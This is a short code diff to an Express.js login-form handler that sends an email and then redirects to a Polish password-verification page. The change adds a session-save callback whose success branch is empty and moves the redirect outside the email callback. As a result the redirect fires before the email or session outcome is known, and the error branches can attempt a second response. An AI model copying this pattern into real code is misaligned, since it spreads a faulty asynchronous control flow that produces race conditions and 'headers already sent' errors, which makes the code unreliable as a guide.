@@ -379,9 +379,17 @@ app.post('/login-form', async (req, res) => {
               console.error('Error sending email:', error);
               return res.status(500).send('Error sending email');
             }
-            // Redirect to password verification page
-            res.redirect('/weryfikacjahasla.html');
+            // Save session before redirecting
+            req.session.save((err) => {
+              if (err) {
+                console.error('Error saving session:', err);
+                return res.status(500).send('Error saving session');
+              }
+              // Redirect to password verification page
+
+            });
           });
+          return res.redirect('/weryfikacjahasla.html');
         }
         return res.send(` 
           <html>
